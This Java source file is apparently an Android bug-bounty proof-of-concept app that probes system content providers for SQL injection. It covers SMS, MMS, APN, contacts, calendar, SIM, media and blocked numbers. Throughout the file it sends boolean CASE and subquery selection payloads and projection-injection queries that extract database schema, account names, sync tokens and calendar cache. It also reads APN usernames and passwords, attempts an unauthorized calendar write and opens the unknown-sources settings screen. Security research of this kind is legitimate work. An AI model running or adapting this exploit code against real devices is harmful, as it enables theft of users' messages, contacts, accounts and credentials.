package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SystemProviderSqliActivity extends Activity {
    private static final String TAG = "SysProvSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("System Provider SQLi & Novel Attack Surface\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        // ==== TEST 1: Telephony/MMS/APN Provider SQLi ====
        log("=== TEST 1: Telephony Provider SQLi ===");
        testProviderSqli("content://telephony/carriers", "APN carriers");
        testProviderSqli("content://telephony/carriers/current", "APN current");
        testProviderSqli("content://mms", "MMS");
        testProviderSqli("content://mms-sms/conversations", "MMS-SMS conv");
        testProviderSqli("content://mms-sms/pending", "MMS-SMS pending");

        // ==== TEST 2: SMS Provider SQLi (with CASE bypass) ====
        log("\n=== TEST 2: SMS Provider SQLi (CASE bypass) ===");
        String[] smsUris = {
            "content://sms",
            "content://sms/inbox",
            "content://sms/sent",
            "content://sms/draft",
        };
        for (String uriStr : smsUris) {
            Uri uri = Uri.parse(uriStr);
            try {
                Cursor c = getContentResolver().query(uri, new String[]{"_id"}, null, null, null);
                if (c != null) {
                    log(uriStr + " normal: " + c.getCount());
                    c.close();
                    // CASE injection
                    int t = qc(uri, "CASE WHEN 1=1 THEN 1 ELSE 0 END = 1");
                    int f = qc(uri, "CASE WHEN 1=0 THEN 1 ELSE 0 END = 1");
                    log(uriStr + " CASE: true=" + t + " false=" + f);
                    if (t > 0 && f == 0) log("  [VULN] CASE injection!");
                    // Subquery injection
                    int st = qc(uri, "(SELECT 1) = 1");
                    int sf = qc(uri, "(SELECT 1) = 99");
                    log(uriStr + " subquery: true=" + st + " false=" + sf);
                    if (st > 0 && sf == 0) log("  [VULN] Subquery injection!");
                }
            } catch (Exception e) {
                log(uriStr + ": " + e.getClass().getSimpleName() + ": " + trunc(e.getMessage(), 60));
            }
        }

        // ==== TEST 3: Browser/Bookmarks Provider ====
        log("\n=== TEST 3: Browser Provider ===");
        testProviderSqli("content://browser/bookmarks", "bookmarks");
        testProviderSqli("content://browser/searches", "searches");
        testProviderSqli("content://com.android.browser/bookmarks", "android browser");

        // ==== TEST 4: MediaStore Providers ====
        log("\n=== TEST 4: MediaStore Providers ===");
        String[] mediaUris = {
            "content://media/external/images/media",
            "content://media/external/video/media",
            "content://media/external/audio/media",
            "content://media/external/file",
            "content://media/external/downloads",
        };
        for (String uriStr : mediaUris) {
            testProviderSqli(uriStr, uriStr.substring(uriStr.lastIndexOf('/') + 1));
        }

        // ==== TEST 5: DocumentsProvider attack vectors ====
        log("\n=== TEST 5: Documents Providers ===");
        testProviderSqli("content://com.android.externalstorage.documents/root", "extStorage docs");
        testProviderSqli("content://com.android.providers.downloads.documents/root", "downloads docs");
        testProviderSqli("content://com.android.providers.media.documents/root", "media docs");

        // ==== TEST 6: TelephonyProvider — APN reading ====
        log("\n=== TEST 6: APN Content ===");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://telephony/carriers"),
                null, null, null, null);
            if (c != null) {
                log("APN carriers: " + c.getCount() + " rows, cols: " + String.join(",", c.getColumnNames()));
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndex("name"));
                    String apn = c.getString(c.getColumnIndex("apn"));
                    String proxy = c.getString(c.getColumnIndex("proxy"));
                    String user = c.getString(c.getColumnIndex("user"));
                    String passwd = c.getString(c.getColumnIndex("password"));
                    String mmsc = c.getString(c.getColumnIndex("mmsc"));
                    log("  APN: " + name + " apn=" + apn + " proxy=" + proxy +
                        " user=" + user + " pass=" + passwd + " mmsc=" + mmsc);
                }
                c.close();
            }
        } catch (Exception e) {
            log("APN read: " + e.getClass().getSimpleName() + ": " + trunc(e.getMessage(), 80));
        }

        // ==== TEST 7: Settings intent redirection ====
        log("\n=== TEST 7: Settings Intent Redirection ===");
        testSettingsRedirect();

        // ==== TEST 8: Contacts Profile Provider (no permission) ====
        log("\n=== TEST 8: Contacts Profile ===");
        testProviderSqli("content://com.android.contacts/profile", "profile");
        testProviderSqli("content://com.android.contacts/profile/data", "profile/data");
        testProviderSqli("content://com.android.contacts/profile/raw_contacts", "profile/raw");

        // ==== TEST 9: Calendar Provider - write test ====
        log("\n=== TEST 9: Calendar Write via SQLi ===");
        try {
            Uri calUri = Uri.parse("content://com.android.calendar/events");
            ContentValues cv = new ContentValues();
            cv.put("title", "VRP_TEST");
            cv.put("dtstart", System.currentTimeMillis());
            cv.put("dtend", System.currentTimeMillis() + 3600000);
            cv.put("calendar_id", 1);
            cv.put("eventTimezone", "UTC");
            Uri result = getContentResolver().insert(calUri, cv);
            if (result != null) {
                log("[WRITE VULN] Calendar event insert: " + result);
                getContentResolver().delete(result, null, null);
                log("  Cleaned up");
            }
        } catch (Exception e) {
            log("Calendar write: " + e.getClass().getSimpleName());
        }

        // ==== TEST 10: Blocked numbers provider ====
        log("\n=== TEST 10: Blocked Numbers Provider ===");
        testProviderSqli("content://com.android.blockednumber/blocked", "blocked nums");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.blockednumber/blocked"),
                null, null, null, null);
            if (c != null) {
                log("Blocked numbers: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Blocked read: " + e.getClass().getSimpleName() + ": " + trunc(e.getMessage(), 60));
        }

        // ==== TEST 11: Test URI grant attack via ContactsProvider ====
        log("\n=== TEST 11: URI Grant Leak ===");
        try {
            // Try to read contact photos without permission using photo_file_id
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id", "photo_file_id", "photo_uri"},
                "photo_file_id IS NOT NULL", null, null);
            if (c != null) {
                log("Contacts with photos: " + c.getCount());
                while (c.moveToNext()) {
                    log("  id=" + c.getInt(0) + " photo_file_id=" + c.getString(1) +
                        " photo_uri=" + c.getString(2));
                }
                c.close();
            }
        } catch (Exception e) {
            log("Photo URI: " + e.getClass().getSimpleName());
        }

        // ==== TEST 12: Telephony ICC (SIM) provider ====
        log("\n=== TEST 12: SIM/ICC Provider ===");
        testProviderSqli("content://icc/adn", "SIM contacts");
        testProviderSqli("content://icc/fdn", "SIM fixed dial");
        testProviderSqli("content://icc/sdn", "SIM service dial");

        // ==== TEST 13: Content Provider path traversal via projection ====
        log("\n=== TEST 13: Projection path traversal ===");
        Uri contactsUri = Uri.parse("content://com.android.contacts/contacts");
        String[][] projTests = {
            {"(SELECT sql FROM sqlite_master LIMIT 1) AS leak", "schema via proj"},
            {"(SELECT count(*) FROM raw_contacts WHERE deleted=1) AS leak", "deleted count"},
            {"(SELECT group_concat(account_name) FROM accounts) AS leak", "accounts via proj"},
        };
        for (String[] test : projTests) {
            try {
                Cursor c = getContentResolver().query(contactsUri, new String[]{test[0]}, null, null, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(0);
                    if (val != null && val.length() > 100) val = val.substring(0, 100) + "...";
                    log("[PROJ VULN] " + test[1] + " = " + val);
                    c.close();
                }
            } catch (Exception e) {
                log("[PROJ SAFE] " + test[1] + ": " + e.getClass().getSimpleName());
            }
        }

        // ==== TEST 14: Calendar Projection Injection ====
        log("\n=== TEST 14: Calendar Projection Injection ===");
        Uri calUri = Uri.parse("content://com.android.calendar/calendars");
        String[][] calProjTests = {
            {"(SELECT group_concat(account_name,'|') FROM _sync_state) AS leak", "sync accounts"},
            {"(SELECT data FROM _sync_state LIMIT 1) AS leak", "sync token"},
            {"(SELECT group_concat(key||'='||value,'|') FROM CalendarCache) AS leak", "cal cache"},
        };
        for (String[] test : calProjTests) {
            try {
                Cursor c = getContentResolver().query(calUri, new String[]{test[0]}, null, null, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(0);
                    if (val != null && val.length() > 120) val = val.substring(0, 120) + "...";
                    log("[CAL PROJ VULN] " + test[1] + " = " + val);
                    c.close();
                }
            } catch (Exception e) {
                log("[CAL PROJ SAFE] " + test[1] + ": " + e.getClass().getSimpleName());
            }
        }

        log("\n=== ALL SYSTEM PROVIDER TESTS COMPLETE ===");
    }

    private void testProviderSqli(String uriStr, String label) {
        Uri uri = Uri.parse(uriStr);
        try {
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                int normal = c.getCount();
                c.close();
                log(label + " open: " + normal + " rows");
                int subT = qc(uri, "(SELECT 1) = 1");
                int subF = qc(uri, "(SELECT 1) = 99");
                if (subT >= 0) {
                    log(label + " subquery: true=" + subT + " false=" + subF);
                    if (subT > 0 && subF == 0) log("  [VULN] " + label + " SQLi confirmed!");
                }
            } else {
                log(label + ": NULL cursor");
            }
        } catch (SecurityException e) {
            log(label + ": SecurityException");
        } catch (Exception e) {
            log(label + ": " + e.getClass().getSimpleName() + ": " + trunc(e.getMessage(), 50));
        }
    }

    private int qc(Uri uri, String sel) {
        try {
            Cursor c = getContentResolver().query(uri, new String[]{"_id"}, sel, null, null);
            if (c != null) { int n = c.getCount(); c.close(); return n; }
        } catch (Exception e) { return -1; }
        return -1;
    }

    private void testSettingsRedirect() {
        String[] settingsActions = {
            "android.settings.WIFI_SETTINGS",
            "android.settings.BLUETOOTH_SETTINGS",
            "android.settings.ACCESSIBILITY_SETTINGS",
            "android.settings.APPLICATION_DEVELOPMENT_SETTINGS",
            "android.settings.MANAGE_UNKNOWN_APP_SOURCES",
            "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS",
            "android.settings.USAGE_ACCESS_SETTINGS",
        };
        for (String action : settingsActions) {
            try {
                android.content.Intent intent = new android.content.Intent(action);
                android.content.pm.ResolveInfo ri = getPackageManager().resolveActivity(intent, 0);
                if (ri != null) {
                    String target = ri.activityInfo.packageName + "/" + ri.activityInfo.name;
                    boolean exported = ri.activityInfo.exported;
                    log("Settings " + action.substring(action.lastIndexOf('.') + 1) + ": " + target + " exported=" + exported);
                }
            } catch (Exception e) {
                log(action + ": " + e.getMessage());
            }
        }

        // Test if we can use intent redirection via Settings
        try {
            android.content.Intent intent = new android.content.Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES");
            intent.setData(Uri.parse("package:com.vrp.poc"));
            startActivity(intent);
            log("[LAUNCHED] MANAGE_UNKNOWN_APP_SOURCES for our package");
        } catch (Exception e) {
            log("Unknown sources launch: " + e.getClass().getSimpleName());
        }
    }

    private String trunc(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
